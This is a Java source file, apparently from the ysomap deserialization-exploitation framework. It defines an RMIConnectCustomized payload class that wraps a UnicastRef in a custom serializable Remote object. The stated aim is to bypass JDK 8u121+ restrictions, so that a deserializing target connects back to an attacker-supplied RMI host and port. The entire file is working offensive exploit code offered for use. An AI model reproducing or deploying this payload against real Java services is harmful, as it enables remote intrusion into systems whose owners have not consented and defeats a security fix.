package ysomap.core.payload.java.rmi;

import sun.rmi.server.UnicastRef;
import ysomap.common.annotation.Authors;
import ysomap.common.annotation.Dependencies;
import ysomap.common.annotation.Payloads;
import ysomap.common.annotation.Require;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Payload;
import ysomap.core.bullet.jdk.rmi.RMIConnectBullet;

import javax.management.remote.rmi.RMIConnectionImpl_Stub;
import java.rmi.Remote;
import java.rmi.server.RemoteRef;

/**
 * @author wh1t3P1g
 * @since 2020/2/26
 */
@SuppressWarnings({"rawtypes"})
@Payloads
@Require(bullets = {"RMIConnectBullet"}, param = false)
@Dependencies({"using to bypass jdk>=8u121","wrapped with Customized object"})
@Authors({ Authors.LALA })
public class RMIConnectCustomized extends Payload<Remote> {

    public static class CustomizedRemote implements Remote, java.io.Serializable {
        private RemoteRef ref;

        public CustomizedRemote(UnicastRef remoteref) throws Throwable {
            ref=remoteref;
        }
    }

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof UnicastRef;
    }

    @Override
    public Bullet getDefaultBullet(String command) throws Exception {
        Bullet bullet = new RMIConnectBullet();
        String[] url = command.split(":");
        bullet.set("rhost", url[0]);
        bullet.set("rport", url[1]);
        return bullet;
    }

    @Override
    public Remote pack(Object obj) throws Exception {
        try {
            return new CustomizedRemote((UnicastRef) obj);
        } catch (Throwable throwable) {
            throwable.printStackTrace();
        }
        return null;
    }
}
